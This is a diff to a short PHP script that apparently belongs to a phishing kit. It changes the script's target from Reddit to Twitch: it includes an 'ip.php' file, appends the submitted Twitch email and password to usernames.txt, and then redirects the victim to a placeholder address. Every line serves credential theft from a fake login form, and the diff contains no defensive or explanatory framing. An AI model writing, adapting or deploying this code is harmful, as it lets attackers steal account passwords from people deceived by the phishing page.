@@ -1,5 +1,6 @@
 <?php
+include 'ip.php';
 
-file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://reddit.com');
+file_put_contents("usernames.txt", "[Twitch-EMAIL]: " . $_POST['twitch_user'] . " [Twitch-PASS]: " . $_POST['twitch_pass'] . "\n", FILE_APPEND);
+header('Location: <CUSTOM>');
 exit();
